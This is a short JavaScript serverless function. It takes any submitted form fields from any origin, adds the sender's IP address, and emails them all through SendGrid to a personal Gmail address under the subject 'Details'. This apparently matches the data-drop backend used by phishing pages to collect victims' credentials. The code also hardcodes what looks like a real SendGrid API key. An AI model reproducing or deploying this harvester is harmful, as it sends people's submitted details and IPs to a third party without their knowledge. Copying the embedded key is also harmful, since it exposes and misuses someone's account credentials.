const sgMail = require("@sendgrid/mail");
const statusCode = 200;
const headers = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "Content-Type"
};
exports.handler = (event, context, callback) => {
  console.log({ event, context });
  let body = event.body;
  body = JSON.parse(body);
  let IP = event.headers["client-ip"];
  var SENDGRID_API_KEY = `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` ;
  sgMail.setApiKey(SENDGRID_API_KEY);
  const msg = {
    to: [ "sheliatran101@gmail.com"],
    from: "no-reply@wpizza.sh",
    subject: "Details",
    text: Object.keys(body).reduce(
      (acc, oj) => `${acc} ${[oj]}:${body[oj]}`,
      `IP Address: ${IP}`
    ),
    html: Object.keys(body).reduce(
      (acc, oj) => `${acc} <strong>${[oj]}: </strong>${body[oj]} <br>`,
      `<strong>IP Address: ${IP}</strong><br>`
    )
  };
  sgMail.sendMultiple(msg);
  callback(null, {
    headers,
    statusCode,
    body: JSON.stringify(msg)
  });
};
